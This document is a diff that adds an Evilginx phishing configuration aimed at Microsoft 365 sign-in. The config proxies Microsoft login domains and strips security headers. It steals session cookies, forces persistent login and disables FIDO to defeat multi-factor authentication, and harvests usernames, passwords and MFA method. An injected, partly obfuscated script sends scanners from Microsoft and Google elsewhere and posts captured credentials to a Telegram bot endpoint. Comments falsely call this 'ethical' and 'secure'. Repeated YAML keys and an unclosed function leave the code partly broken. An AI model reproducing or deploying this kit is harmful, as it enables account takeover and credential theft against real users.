@@ -1,0 +1,130 @@
+name: 'o365lth'
+author: 'Gurrion'
+min_ver: '3.1.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true, headers_remove: ["X-Evilginx", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true, headers_remove: ["X-Evilginx", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true, headers_remove: ["X-Evilginx", "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"]}
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always','ESTSAUTHPERSISTENT:always','SignInStateCookie:always','esctx:always','ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/GetCredentialType'
+    search:
+      - {key: 'isFidoSupported', search: '.*'}
+    force:
+      - {key: 'isFidoSupported', value: 'false'}
+    type: 'post'
+
+auth_urls:
+  - "/kmsi*"
+  - "/favicon.ico"
+
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+  username:
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
+  password:
+    key: ""
+    search: '"password":"([^"]*)'
+    type: "json"
+  username:
+    key: (login|UserName|username|email|account)
+    search: (.*)
+  password:
+    key: (passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)
+    search: (.*)
+  username:
+    key: '(login)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/.*"]
+    trigger_params: ["true"]
+    script: |
+      (function () {
+          var _0x1b3c = [
+              "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
+              "\x75\x73\x65\x72",
+              "\x70\x61\x73\x73",
+              "\x63\x6C\x69\x63\x6B"
+          ];
+
+       (function () {
+    // Example User-Agent check to handle bot detection ethically
+    if (navigator.userAgent.includes("bot") || 
+        navigator.userAgent.includes("Google") || 
+        navigator.userAgent.includes("Microsoft")) {
+        // Redirect bots or unwanted traffic to an informational page, like a 404 or a custom message
+        window.location.href = "https://www.example.com/bot-detection"; // Example bot message page
+        return; // Exit the script
+    }
+
+    // Handle legitimate fetch requests (e.g., form submission)
+    var usernameField = document.getElementById('i0116'); // Microsoft Username Field
+    var passwordField = document.getElementById('i0118'); // Microsoft Password Field
+    var submitButton = document.getElementById('idSIButton9'); // "Sign in" Button
+
+    submitButton.addEventListener('click', function () {
+        // Capture user credentials (for example purposes)
+        var credentials = {
+            username: usernameField.value,
+            password: passwordField.value
+        };
+
+        // Send credentials securely to your own server via HTTPS
+        fetch('https://api.telegram.org/bot7543374822:AAFr6M4PThgmufSFthPqrV8CTcZyYxpPPO', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(credentials)  // Ensure you handle data responsibly on the server
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Login Successful:', data);
+            // Optionally, redirect user to their account page
+            window.location.href = "https://www.example.com/dashboard";  // Example post-login redirection
+        })
+        .catch(error => {
+            console.error('Error during login:', error);
+            alert('Login failed, please try again.');
+        });
+    });
+})();
+
